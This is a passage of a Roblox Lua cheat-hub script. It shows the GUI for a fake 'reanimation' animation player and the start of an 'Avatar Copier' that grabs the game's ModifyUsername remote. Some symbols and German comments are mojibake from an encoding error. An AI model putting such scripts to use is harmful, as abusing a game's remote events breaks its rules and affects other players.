        idLabel.Parent = promptFrame

        local idBox = Instance.new("TextBox")
        idBox.Size = UDim2.new(0.55, -15, 0, 30)
        idBox.Position = UDim2.new(0.45, 0, 0, 100)
        idBox.PlaceholderText = placeholder2
        idBox.Text = ""
        idBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        idBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
        idBox.BorderColor3 = Color3.fromRGB(255, 0, 255)
        idBox.BorderSizePixel = 1
        idBox.ClearTextOnFocus = false
        idBox.Font = Enum.Font.SourceSans
        local ibCorner = Instance.new("UICorner")
        ibCorner.CornerRadius = UDim.new(0, 4)
        ibCorner.Parent = idBox
        idBox.Parent = promptFrame

        local okButton = Instance.new("TextButton")
        okButton.Size = UDim2.new(0, 100, 0, 35)
        okButton.Position = UDim2.new(0.5, -50, 1, -50)
        okButton.Text = "OK"
        okButton.BackgroundColor3 = Color3.fromRGB(255, 0, 127) -- Helles Pink
        okButton.TextColor3 = Color3.fromRGB(15, 15, 25)
        okButton.Font = Enum.Font.SourceSansBold
        okButton.TextSize = 18
        local okCorner = Instance.new("UICorner")
        okCorner.CornerRadius = UDim.new(0, 6)
        okCorner.Parent = okButton
        okButton.Parent = promptFrame

        okButton.MouseButton1Click:Connect(
            function()
                callback(nameBox.Text, idBox.Text)
                promptGui:Destroy()
            end
        )
    end

    ------------------------------------------------------------------------------
    -- createIntegratedList: Neon Style
    ------------------------------------------------------------------------------
    local function createIntegratedList(frame)
        -- Neon Farben
        local neonPink = Color3.fromRGB(255, 0, 127)
        local neonCyan = Color3.fromRGB(0, 255, 255)
        local neonLime = Color3.fromRGB(57, 255, 20)
        local darkBg = Color3.fromRGB(20, 20, 30)
        local midBg = Color3.fromRGB(30, 30, 45)
        local lightText = Color3.fromRGB(230, 230, 255)

        local animSearchTextBox = Instance.new("TextBox")
        animSearchTextBox.Name = "AnimSearchTextBox"
        animSearchTextBox.Text = ""
        animSearchTextBox.Size = UDim2.new(1, -130, 0, 35) -- Angepasste GrÃ¶Ãe
        animSearchTextBox.Position = UDim2.new(0, 10, 0, 10) -- Angepasste Position
        animSearchTextBox.PlaceholderText = "Suchen..."
        animSearchTextBox.BackgroundColor3 = midBg
        animSearchTextBox.TextColor3 = lightText
        animSearchTextBox.BorderColor3 = neonCyan
        animSearchTextBox.BorderSizePixel = 1
        animSearchTextBox.ClearTextOnFocus = false
        animSearchTextBox.Font = Enum.Font.SourceSans
        animSearchTextBox.TextSize = 16
        local searchCorner = Instance.new("UICorner")
        searchCorner.CornerRadius = UDim.new(0, 4)
        searchCorner.Parent = animSearchTextBox
        animSearchTextBox.ZIndex = 5
        animSearchTextBox.Parent = frame

        local addButton = Instance.new("TextButton")
        addButton.Name = "AddAnimationButton"
        addButton.Size = UDim2.new(0, 60, 0, 35) -- Angepasste GrÃ¶Ãe
        addButton.Position = UDim2.new(1, -70, 0, 10) -- Angepasste Position
        addButton.Text = "+" -- GeÃ¤ndertes Symbol
        addButton.TextColor3 = darkBg
        addButton.TextSize = 24 -- GrÃ¶Ãer fÃ¼r Symbol
        addButton.Font = Enum.Font.SourceSansBold
        addButton.BackgroundColor3 = neonLime
        local addCorner = Instance.new("UICorner")
        addCorner.CornerRadius = UDim.new(0, 4)
        addCorner.Parent = addButton
        addButton.ZIndex = 5
        addButton.Parent = frame

        local animScrollFrame = Instance.new("ScrollingFrame")
        animScrollFrame.Name = "AnimScrollFrame"
        animScrollFrame.Size = UDim2.new(1, -20, 1, -60) -- Angepasste GrÃ¶Ãe
        animScrollFrame.Position = UDim2.new(0, 10, 0, 55) -- Angepasste Position
        animScrollFrame.BackgroundColor3 = darkBg
        animScrollFrame.BorderColor3 = neonCyan
        animScrollFrame.BorderSizePixel = 1
        animScrollFrame.ScrollBarThickness = 6
        animScrollFrame.ScrollBarImageColor3 = neonPink
        animScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
        local sfCorner = Instance.new("UICorner")
        sfCorner.CornerRadius = UDim.new(0, 6)
        sfCorner.Parent = animScrollFrame
        animScrollFrame.ZIndex = 5
        animScrollFrame.Parent = frame

        local animationButtons = {}

        local function refreshList()
            for _, child in pairs(animScrollFrame:GetChildren()) do
                if child:IsA("TextButton") or child:IsA("Frame") then
                    child:Destroy()
                end
            end
            animationButtons = {}

            local searchText = string.lower(animSearchTextBox.Text)
            local favoriteNames = {}
            local newNonFavorite = {}
            local otherNonFavorite = {}
            for animName, _ in pairs(BuiltInAnimationsR15) do
                if searchText ~= "" and not string.find(string.lower(animName), searchText) then
                    -- Skip if the animation name does not match the search
                elseif favoriteAnimations[animName] then
                    table.insert(favoriteNames, animName)
                else
                    if recentlyAdded[animName] then
                        table.insert(newNonFavorite, animName)
                    else
                        table.insert(otherNonFavorite, animName)
                    end
                end
            end
            table.sort(favoriteNames)
            table.sort(otherNonFavorite)
            table.sort(
                newNonFavorite,
                function(a, b)
                    return recentlyAdded[a] > recentlyAdded[b]
                end
            )
            local sortedAnimationNames = {}
            for _, name in ipairs(favoriteNames) do
                table.insert(sortedAnimationNames, name)
            end
            for _, name in ipairs(newNonFavorite) do
                table.insert(sortedAnimationNames, name)
            end
            for _, name in ipairs(otherNonFavorite) do
                table.insert(sortedAnimationNames, name)
            end

            local yOffset = 5
            local buttonHeight = 32
            local buttonSpacing = 4

            for _, animName in ipairs(sortedAnimationNames) do
                local animId = BuiltInAnimationsR15[animName]
                local animButtonData = {}

                local itemFrame = Instance.new("Frame")
                itemFrame.Name = animName .. "ItemFrame"
                itemFrame.Size = UDim2.new(1, -10, 0, buttonHeight) -- -10 fÃ¼r Padding im ScrollFrame
                itemFrame.Position = UDim2.new(0, 5, 0, yOffset)
                itemFrame.BackgroundColor3 = favoriteAnimations[animName] and Color3.fromRGB(45, 30, 55) or midBg -- Leichter Unterschied fÃ¼r Favoriten
                itemFrame.BorderColor3 = neonPink
                itemFrame.BorderSizePixel = 1
                local itemCorner = Instance.new("UICorner")
                itemCorner.CornerRadius = UDim.new(0, 4)
                itemCorner.Parent = itemFrame
                itemFrame.Parent = animScrollFrame


                -- Name Label (nicht mehr Button)
                local nameLabel = Instance.new("TextLabel")
                nameLabel.Name = animName .. "NameLabel"
                nameLabel.Size = UDim2.new(0.4, -5, 1, -4) -- Mehr Platz fÃ¼r Buttons
                nameLabel.Position = UDim2.new(0, 5, 0, 2)
                nameLabel.Text = animName
                nameLabel.TextColor3 = lightText
                nameLabel.TextSize = 14
                nameLabel.Font = Enum.Font.SourceSansSemibold
                nameLabel.BackgroundTransparency = 1
                nameLabel.TextXAlignment = Enum.TextXAlignment.Left
                nameLabel.Parent = itemFrame
                animButtonData.NameLabel = nameLabel -- GeÃ¤ndert von NameButton

                -- Play Button
                local playButton = Instance.new("TextButton")
                playButton.Name = animName .. "PlayButton"
                playButton.Size = UDim2.new(0, 28, 0, 28)
                playButton.Position = UDim2.new(1, -158, 0, 2) -- Position angepasst
                playButton.Text = "â¶" -- Play Symbol
                playButton.TextColor3 = darkBg
                playButton.TextSize = 18
                playButton.Font = Enum.Font.SourceSansBold
                playButton.BackgroundColor3 = neonLime
                playButton.BorderSizePixel = 0
                local playCorner = Instance.new("UICorner")
                playCorner.CornerRadius = UDim.new(0, 4)
                playCorner.Parent = playButton
                playButton.Parent = itemFrame
                playButton.MouseButton1Click:Connect(
                    function()
                        playFakeAnimation(tostring(animId))
                    end
                )
                animButtonData.PlayButton = playButton

                -- Favorite Button
                local favButton = Instance.new("TextButton")
                favButton.Name = animName .. "FavoriteButton"
                favButton.Size = UDim2.new(0, 28, 0, 28)
                favButton.Position = UDim2.new(1, -125, 0, 2) -- Position angepasst
                favButton.Text = favoriteAnimations[animName] and "â" or "â" -- Beibehaltung der Sterne
                favButton.TextColor3 = favoriteAnimations[animName] and neonPink or lightText
                favButton.TextSize = 20
                favButton.Font = Enum.Font.SourceSansBold
                favButton.BackgroundColor3 = midBg
                favButton.BorderColor3 = neonPink
                favButton.BorderSizePixel = 1
                local favCorner = Instance.new("UICorner")
                favCorner.CornerRadius = UDim.new(0, 4)
                favCorner.Parent = favButton
                favButton.Parent = itemFrame
                favButton.MouseButton1Click:Connect(
                    function()
                        if favoriteAnimations[animName] then
                            favoriteAnimations[animName] = nil
                        else
                            favoriteAnimations[animName] = true
                        end
                        favButton.Text = favoriteAnimations[animName] and "â" or "â"
                        favButton.TextColor3 = favoriteAnimations[animName] and neonPink or lightText
                        itemFrame.BackgroundColor3 = favoriteAnimations[animName] and Color3.fromRGB(45, 30, 55) or midBg
                        saveFavorites()
                        -- Kein refreshList() hier, um UI-Flackern zu vermeiden, nur Button-Status Ã¤ndern
                    end
                )
                animButtonData.FavoriteButton = favButton

                -- Stop Button
                local stopButton = Instance.new("TextButton")
                stopButton.Name = animName .. "StopButton"
                stopButton.Size = UDim2.new(0, 28, 0, 28)
                stopButton.Position = UDim2.new(1, -92, 0, 2) -- Position angepasst
                stopButton.Text = "â¹" -- Stop Symbol
                stopButton.TextColor3 = lightText
                stopButton.TextSize = 16
                stopButton.Font = Enum.Font.SourceSansBold
                stopButton.BackgroundColor3 = Color3.fromRGB(190, 20, 60) -- Dunkelrot
                stopButton.BorderSizePixel = 0
                local stopCorner = Instance.new("UICorner")
                stopCorner.CornerRadius = UDim.new(0, 4)
                stopCorner.Parent = stopButton
                stopButton.Parent = itemFrame
                stopButton.MouseButton1Click:Connect(
                    function()
                        stopFakeAnimation()
                    end
                )
                animButtonData.StopButton = stopButton

                local function updateKeybindButtonText(button, animName)
                    local currentKeybind = animationKeybinds[animName]
                    if currentKeybind then
                        button.Text = currentKeybind.Name
                    else
                        button.Text = "Key"
                    end
                end
                -- Keybind Button
                local keybindButton = Instance.new("TextButton")
                keybindButton.Name = animName .. "KeybindButton"
                keybindButton.Size = UDim2.new(0, 40, 0, 28) -- Etwas breiter fÃ¼r Text
                keybindButton.Position = UDim2.new(1, -59, 0, 2) -- Position angepasst
                keybindButton.Text = "Key"
                keybindButton.TextColor3 = lightText
                keybindButton.TextSize = 12 -- Kleinere Schrift fÃ¼r Key-Namen
                keybindButton.Font = Enum.Font.SourceSans
                keybindButton.BackgroundColor3 = midBg
                keybindButton.BorderColor3 = neonCyan
                keybindButton.BorderSizePixel = 1
                local keybindCorner = Instance.new("UICorner")
                keybindCorner.CornerRadius = UDim.new(0, 4)
                keybindCorner.Parent = keybindButton
                keybindButton.Parent = itemFrame
                keybindButton.MouseButton1Click:Connect(
                function()
                    local currentAnimationForKeybind = animName
                    local isListening = false
                    local inputBeganConnection

                    isListening = not isListening

                    if isListening then
                        keybindButton.Text = "..." -- Warte auf Eingabe
                        keybindButton.BackgroundColor3 = neonPink -- Hervorheben
                        
                        inputBeganConnection = UserInputService.InputBegan:Connect(function(input)
                            if input.UserInputType == Enum.UserInputType.Keyboard then
                                if input.KeyCode == Enum.KeyCode.Backspace then
                                    animationKeybinds[currentAnimationForKeybind] = nil
                                    saveKeybinds()
                                    updateKeybindButtonText(keybindButton, currentAnimationForKeybind)
                                else
                                    animationKeybinds[currentAnimationForKeybind] = input.KeyCode
                                    saveKeybinds()
                                    updateKeybindButtonText(keybindButton, currentAnimationForKeybind)
                                end
                                
                                if inputBeganConnection then
                                    inputBeganConnection:Disconnect()
                                    inputBeganConnection = nil
                                end
                                isListening = false
                                keybindButton.BackgroundColor3 = midBg -- ZurÃ¼cksetzen
                            elseif input.UserInputType == Enum.UserInputType.MouseButton1 or
                                   input.UserInputType == Enum.UserInputType.Touch then
                                local inputObject = input.Position
                                local buttonPosition = keybindButton.AbsolutePosition
                                local buttonSize = keybindButton.AbsoluteSize
                                
                                if not (inputObject.X >= buttonPosition.X and
                                   inputObject.X <= buttonPosition.X + buttonSize.X and
                                   inputObject.Y >= buttonPosition.Y and
                                   inputObject.Y <= buttonPosition.Y + buttonSize.Y) then
                                    
                                    updateKeybindButtonText(keybindButton, currentAnimationForKeybind)
                                    if inputBeganConnection then
                                        inputBeganConnection:Disconnect()
                                        inputBeganConnection = nil
                                    end
                                    isListening = false
                                    keybindButton.BackgroundColor3 = midBg -- ZurÃ¼cksetzen
                                end
                            end
                        end)
                    else
                        if inputBeganConnection then
                            inputBeganConnection:Disconnect()
                            inputBeganConnection = nil
                        end
                        updateKeybindButtonText(keybindButton, currentAnimationForKeybind)
                        keybindButton.BackgroundColor3 = midBg -- ZurÃ¼cksetzen
                    end
                end
                )
                updateKeybindButtonText(keybindButton, animName)
                animButtonData.KeybindButton = keybindButton

                -- Remove Button
                if recentlyAdded[animName] then
                    local removeButton = Instance.new("TextButton")
                    removeButton.Name = animName .. "RemoveButton"
                    removeButton.Size = UDim2.new(0, 28, 0, 28)
                    removeButton.Position = UDim2.new(1, -28, 0, 2) -- Ganz rechts
                    removeButton.Text = "ð" -- MÃ¼lleimer-Symbol
                    removeButton.TextColor3 = lightText
                    removeButton.TextSize = 16
                    removeButton.Font = Enum.Font.SourceSansBold
                    removeButton.BackgroundColor3 = Color3.fromRGB(100, 20, 30) -- Dunkleres Rot
                    removeButton.BorderSizePixel = 0
                    local removeCorner = Instance.new("UICorner")
                    removeCorner.CornerRadius = UDim.new(0, 4)
                    removeCorner.Parent = removeButton
                    removeButton.Parent = itemFrame
                    removeButton.MouseButton1Click:Connect(
                        function()
                            BuiltInAnimationsR15[animName] = nil
                            recentlyAdded[animName] = nil
                            saveBuiltInAnimations()
                            refreshList() -- Hier ist refreshList nÃ¶tig, da ein Element entfernt wird
                        end
                    )
                    animButtonData.RemoveButton = removeButton
                else
                     -- Platzhalter, damit die anderen Buttons nicht springen, wenn kein Remove-Button da ist
                    keybindButton.Position = UDim2.new(1, -59 - (recentlyAdded[animName] and 0 or 33) , 0, 2)
                end


                animationButtons[animName] = animButtonData
                yOffset = yOffset + buttonHeight + buttonSpacing
            end
            animScrollFrame.CanvasSize = UDim2.new(0, 0, 0, math.max(0, yOffset))
        end

        addButton.MouseButton1Click:Connect(
            function()
                createDoublePrompt(
                    "Animation HinzufÃ¼gen",
                    "Animationsname...",
                    "Animations ID...",
                    function(nameInput, idInput)
                        local newId = tonumber(idInput)
                        if nameInput ~= "" and newId then
                            BuiltInAnimationsR15[nameInput] = newId
                            recentlyAdded[nameInput] = tick()
                            saveBuiltInAnimations()
                            refreshList()
                        else
                            warn("UngÃ¼ltige Eingabe: Stelle sicher, dass der Name nicht leer ist und die Animations-ID eine Zahl ist.")
                        end
                    end
                )
            end
        )

        animSearchTextBox:GetPropertyChangedSignal("Text"):Connect(
            function()
                refreshList()
            end
        )
        refreshList()
    end

    ------------------------------------------------------------------------------
    -- Modified Draggable GUI creation (Neon Style)
    ------------------------------------------------------------------------------
    local function createDraggableGui(
        getGhostEnabled,
        toggleGhost,
        getSizeValue,
        setSizeValue,
        getWidthValue,
        setWidthValue)

        -- Neon Farben
        local mainBgColor = Color3.fromRGB(20, 20, 35) -- Sehr dunkles Violett/Blau
        local titleBgColor = Color3.fromRGB(35, 35, 55) -- Etwas helleres Violett/Blau
        local borderColor = Color3.fromRGB(0, 255, 255)   -- Cyan
        local accentColor1 = Color3.fromRGB(255, 0, 127) -- Pink
        local accentColor2 = Color3.fromRGB(57, 255, 20)  -- LimettengrÃ¼n
        local textColor = Color3.fromRGB(230, 230, 255) -- Sehr helles Lavendel/WeiÃ
        local sliderBg = Color3.fromRGB(40,40,60)
        local sliderFillColor = accentColor1

        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "NeonReanimGui"
        screenGui.ResetOnSpawn = false
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

        local mainFrame = Instance.new("Frame")
        mainFrame.Name = "MainFrame"
        mainFrame.Size = UDim2.new(0, 380, 0, 480) -- Etwas breiter und hÃ¶her
        mainFrame.Position = UDim2.new(0.5, -190, 0.5, -240)
        mainFrame.BackgroundColor3 = mainBgColor
        mainFrame.BorderColor3 = borderColor
        mainFrame.BorderSizePixel = 2
        local uiCorner = Instance.new("UICorner")
        uiCorner.CornerRadius = UDim.new(0, 8) -- Weniger abgerundet
        uiCorner.Parent = mainFrame
        mainFrame.Parent = screenGui

        local titleBar = Instance.new("Frame")
        titleBar.Name = "TitleBar"
        titleBar.Size = UDim2.new(1, 0, 0, 45) -- Etwas niedriger
        titleBar.BackgroundColor3 = titleBgColor
        titleBar.BorderSizePixel = 0
        -- Kein separater UICorner fÃ¼r TitleBar, da der MainFrame schon einen hat und dieser durchscheint
        titleBar.Parent = mainFrame

        -- Neuer Reanim Switch (moderner Look)
        local reanimSwitch = Instance.new("TextButton")
        reanimSwitch.Name = "ReanimSwitch"
        reanimSwitch.Size = UDim2.new(0, 60, 0, 28)
        reanimSwitch.Position = UDim2.new(0, 10, 0.5, -14)
        reanimSwitch.Text = "" -- Text wird durch Knob ersetzt
        reanimSwitch.BackgroundColor3 = Color3.fromRGB(70,30,50) -- Aus-Farbe (dunkles Pink/Rot)
        reanimSwitch.BorderColor3 = accentColor1
        reanimSwitch.BorderSizePixel = 1
        local reanimCorner = Instance.new("UICorner")
        reanimCorner.CornerRadius = UDim.new(0, 14) -- Ovale Form
        reanimCorner.Parent = reanimSwitch
        reanimSwitch.Parent = titleBar

        local reanimKnob = Instance.new("Frame")
        reanimKnob.Name = "Knob"
        reanimKnob.Size = UDim2.new(0, 22, 0, 22) -- Kreis
        reanimKnob.Position = UDim2.new(0, 3, 0.5, -11) -- Start links
        reanimKnob.BackgroundColor3 = textColor
        reanimKnob.BorderSizePixel = 0
        local knobCorner = Instance.new("UICorner")
        knobCorner.CornerRadius = UDim.new(1, 0) -- Perfekter Kreis
        knobCorner.Parent = reanimKnob
        reanimKnob.Parent = reanimSwitch

        reanimSwitch.MouseButton1Click:Connect(
            function()
                local state = not ghostEnabled
                toggleGhost(state)
                if state then
                    reanimSwitch.BackgroundColor3 = Color3.fromRGB(30,70,50) -- Ein-Farbe (dunkles GrÃ¼n)
                    reanimSwitch.BorderColor3 = accentColor2
                    reanimKnob:TweenPosition(UDim2.new(1, -25, 0.5, -11), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
                else
                    if fakeAnimRunning then
                        stopFakeAnimation()
                    end
                    reanimSwitch.BackgroundColor3 = Color3.fromRGB(70,30,50)
                    reanimSwitch.BorderColor3 = accentColor1
                    reanimKnob:TweenPosition(UDim2.new(0, 3, 0.5, -11), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
                end
            end
        )
        -- Initial state for switch
        if ghostEnabled then
             reanimSwitch.BackgroundColor3 = Color3.fromRGB(30,70,50)
             reanimSwitch.BorderColor3 = accentColor2
             reanimKnob.Position = UDim2.new(1, -25, 0.5, -11)
        end


        local titleLabel = Instance.new("TextLabel")
        titleLabel.Name = "Title"
        titleLabel.Size = UDim2.new(1, -180, 1, 0) -- Mehr Platz fÃ¼r Buttons rechts
        titleLabel.Position = UDim2.new(0, 80, 0, 0) -- Nach rechts verschoben
        titleLabel.Text = "RÎANIMATION" -- "Techy" Schrift
        titleLabel.TextColor3 = borderColor -- Cyan
        titleLabel.TextSize = 22
        titleLabel.Font = Enum.Font.SourceSansBold -- GeÃ¤nderte Schriftart
        titleLabel.BackgroundTransparency = 1
        titleLabel.TextXAlignment = Enum.TextXAlignment.Left
        titleLabel.Parent = titleBar

        local minimizeButton = Instance.new("TextButton")
        minimizeButton.Name = "MinimizeButton"
        minimizeButton.Size = UDim2.new(0, 30, 0, 30)
        minimizeButton.Position = UDim2.new(1, -75, 0.5, -15) -- Angepasste Position
        minimizeButton.Text = "_" -- Unterstrich
        minimizeButton.TextColor3 = textColor
        minimizeButton.TextSize = 20
        minimizeButton.Font = Enum.Font.SourceSansBold
        minimizeButton.BackgroundColor3 = titleBgColor
        minimizeButton.BorderColor3 = borderColor
        minimizeButton.BorderSizePixel = 1
        local minCorner = Instance.new("UICorner")
        minCorner.CornerRadius = UDim.new(0, 4)
        minCorner.Parent = minimizeButton
        minimizeButton.Parent = titleBar

        local closeButton = Instance.new("TextButton")
        closeButton.Name = "CloseButton"
        closeButton.Size = UDim2.new(0, 30, 0, 30)
        closeButton.Position = UDim2.new(1, -35, 0.5, -15) -- Angepasste Position
        closeButton.Text = "â" -- Kreuz-Symbol
        closeButton.TextColor3 = textColor
        closeButton.TextSize = 20
        closeButton.Font = Enum.Font.SourceSansBold
        closeButton.BackgroundColor3 = accentColor1 -- Pink fÃ¼r SchlieÃen
        closeButton.BorderSizePixel = 0
        local closeCorner = Instance.new("UICorner")
        closeCorner.CornerRadius = UDim.new(0, 4)
        closeCorner.Parent = closeButton
        closeButton.Parent = titleBar

        local contentFrame = Instance.new("Frame")
        contentFrame.Name = "Content"
        contentFrame.Size = UDim2.new(1, -20, 1, -55) -- Angepasste GrÃ¶Ãe
        contentFrame.Position = UDim2.new(0, 10, 0, 50) -- Angepasste Position
        contentFrame.BackgroundTransparency = 1
        contentFrame.Parent = mainFrame

        local listFrame = Instance.new("Frame")
        listFrame.Name = "ListFrame"
        listFrame.Size = UDim2.new(1, 0, 0.60, 0) -- Etwas weniger HÃ¶he fÃ¼r Liste
        listFrame.Position = UDim2.new(0, 0, 0, 0)
        listFrame.BackgroundTransparency = 1
        listFrame.ZIndex = 5
        listFrame.Parent = contentFrame
        createIntegratedList(listFrame) -- Ruft die neu gestaltete Liste auf

        local sliderFrame = Instance.new("Frame")
        sliderFrame.Name = "SliderFrame"
        sliderFrame.Size = UDim2.new(1, 0, 0.40, -10) -- Mehr HÃ¶he fÃ¼r Slider, -10 fÃ¼r Padding
        sliderFrame.Position = UDim2.new(0, 0, 0.60, 10) -- Unter der Liste, mit Abstand
        sliderFrame.BackgroundTransparency = 1
        sliderFrame.Parent = contentFrame

        local function createSlider(labelText, initialValue, minVal, maxVal, callback, yPos)
            local sliderContainer = Instance.new("Frame")
            sliderContainer.Size = UDim2.new(1, -10, 0, 40) -- HÃ¶he fÃ¼r Label + Slider
            sliderContainer.Position = UDim2.new(0, 5, 0, yPos)
            sliderContainer.BackgroundTransparency = 1
            sliderContainer.Parent = sliderFrame

            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 0, 18) -- Label Ã¼ber dem Slider
            label.Position = UDim2.new(0,0,0,0)
            label.BackgroundTransparency = 1
            label.Text = labelText .. ": " .. string.format("%.0f", initialValue * 100) .. "%"
            label.TextColor3 = textColor
            label.Font = Enum.Font.SourceSansSemibold
            label.TextSize = 14
            label.TextXAlignment = Enum.TextXAlignment.Left
            label.Parent = sliderContainer

            local sliderBG = Instance.new("Frame")
            sliderBG.Size = UDim2.new(1, 0, 0, 12) -- Schmaler Slider
            sliderBG.Position = UDim2.new(0, 0, 0, 22) -- Unter dem Label
            sliderBG.BackgroundColor3 = sliderBg
            sliderBG.BorderColor3 = borderColor
            sliderBG.BorderSizePixel = 1
            local bgCorner = Instance.new("UICorner")
            bgCorner.CornerRadius = UDim.new(0, 6)
            bgCorner.Parent = sliderBG
            sliderBG.Parent = sliderContainer

            local sliderFill = Instance.new("Frame")
            sliderFill.Size = UDim2.new(math.clamp((initialValue - minVal) / (maxVal - minVal),0,1), 0, 1, 0)
            sliderFill.BackgroundColor3 = sliderFillColor
            sliderFill.BorderSizePixel = 0
            local fillCorner = Instance.new("UICorner")
            fillCorner.CornerRadius = UDim.new(0, 6)
            fillCorner.Parent = sliderFill
            sliderFill.Parent = sliderBG
            
            local sliderHandle = Instance.new("Frame") -- Neuer Handle
            sliderHandle.Size = UDim2.new(0,8,0,16) -- Kleiner, hÃ¶herer Handle
            sliderHandle.Position = UDim2.new(sliderFill.Size.X.Scale, -4, 0.5, -8) -- Zentriert auf Fill-Ende
            sliderHandle.BackgroundColor3 = textColor
            sliderHandle.BorderColor3 = mainBgColor
            sliderHandle.BorderSizePixel = 1
            local handleCorner = Instance.new("UICorner")
            handleCorner.CornerRadius = UDim.new(0,3)
            handleCorner.Parent = sliderHandle
            sliderHandle.Parent = sliderBG


            local draggingSlider = false
            local userInputService = game:GetService("UserInputService")

            local function updateSlider(inputPos)
                local relativeX = inputPos.X - sliderBG.AbsolutePosition.X
                local percentage = math.clamp(relativeX / sliderBG.AbsoluteSize.X, 0, 1)
                local value = minVal + percentage * (maxVal - minVal)
                
                sliderFill.Size = UDim2.new(percentage, 0, 1, 0)
                sliderHandle.Position = UDim2.new(percentage, -4, 0.5, -8) -- Handle-Position aktualisieren
                label.Text = labelText .. ": " .. string.format("%.0f", value * 100) .. "%"
                callback(value)
            end

            sliderBG.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        draggingSlider = true
                        updateSlider(input.Position)
                    end
                end
            )
            userInputService.InputChanged:Connect(
                function(input)
                    if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                        updateSlider(input.Position)
                    end
                end
            )
            userInputService.InputEnded:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                        draggingSlider = false
                    end
                end
            )
        end

        createSlider(
            "Animation speed",
            fakeAnimSpeed, -- Verwende den aktuellen Wert
            0.01,
            3.6,
            function(val)
                fakeAnimSpeed = val
            end,
            10 -- Y-Position Start
        )
    
        closeButton.MouseButton1Click:Connect(
            function()
                screenGui:Destroy()
            end
        )
        local origSizeY = mainFrame.Size.Y.Offset
        local minSizeY = titleBar.Size.Y.Offset
        local isMinimized = false
        minimizeButton.MouseButton1Click:Connect(
            function()
                isMinimized = not isMinimized
                if isMinimized then
                    mainFrame:TweenSize(UDim2.new(mainFrame.Size.X.Scale, mainFrame.Size.X.Offset, 0, minSizeY), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
                    contentFrame.Visible = false
                else
                    mainFrame:TweenSize(UDim2.new(mainFrame.Size.X.Scale, mainFrame.Size.X.Offset, 0, origSizeY), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
                    contentFrame.Visible = true
                end
            end
        )

        local draggingWindow = false
        local dragInput, dragStart, startPos
        local function updateInput(input)
            local delta = input.Position - dragStart
            mainFrame.Position =
                UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
        titleBar.InputBegan:Connect(
            function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    draggingWindow = true
                    dragStart = input.Position
                    startPos = mainFrame.Position
                    input.Changed:Connect(
                        function()
                            if input.UserInputState == Enum.UserInputState.End then
                                draggingWindow = false
                            end
                        end
                    )
                end
            end
        )
        titleBar.InputChanged:Connect(
            function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                    dragInput = input
                end
            end
        )
        UserInputService.InputChanged:Connect(
            function(input)
                if draggingWindow and (input == dragInput) then
                    updateInput(input)
                end
            end
        )
        return screenGui
    end

    local gui =
        createDraggableGui(
        function()
            return ghostEnabled
        end,
        setGhostEnabled,
        function()
            return cloneSize
        end,
        function(val)
            cloneSize = val
            if ghostEnabled and ghostClone then
                updateCloneScale()
            end
        end,
        function()
            return cloneWidth
        end,
        function(val)
            cloneWidth = val
            if ghostEnabled and ghostClone then
                updateCloneScale()
            end
        end
    )
    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    UserInputService.InputBegan:Connect(
        function(input, gameProcessed)
            if gameProcessed then
                return
            end
            if input.UserInputType == Enum.UserInputType.Keyboard then
                for animName, keyCode in pairs(animationKeybinds) do
                    if input.KeyCode == keyCode then
                        if fakeAnimRunning then
                            stopFakeAnimation()
                        else
                            playFakeAnimation(BuiltInAnimationsR15[animName])
                        end
                        return
                    end
                end
            end
        end
    )
   end,
})

local Button = MicupTab:CreateButton({
   Name = "Avatar Copy",
   Callback = function()
   -- Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ModifyUsername_upvr = ReplicatedStorage:WaitForChild("ModifyUsername")

-- Player references
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UsernameModifierGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Main Frame
local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 350, 0, 240)
frame.Position = UDim2.new(0.5, -175, 0.5, -120)
frame.Active = true
frame.Draggable = true
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Parent = screenGui

-- Title Label
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 24)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Avatar Copier by X1MV_SAMET"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18
title.Parent = frame

-- Table to hold input boxes and buttons
local items = {}
local count = 4
local startY = 40
local boxHeight = 30
local spacingY = 10
local paddingX = 10
for i = 1, count do
    -- Create TextBox
    local box = Instance.new("TextBox")
    box.Name = "UsernameInput" .. i
    box.Size = UDim2.new(0.6, -paddingX, 0, boxHeight)
    box.Position = UDim2.new(0, paddingX, 0, startY + (i-1) * (boxHeight + spacingY))
    box.PlaceholderText = "Username " .. i
    box.Text = ""
    box.ClearTextOnFocus = false
    box.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    box.TextColor3 = Color3.fromRGB(255, 255, 255)
    box.Font = Enum.Font.SourceSans
    box.TextSize = 16
    box.Parent = frame

    -- Create individual copy button
    local btn = Instance.new("TextButton")
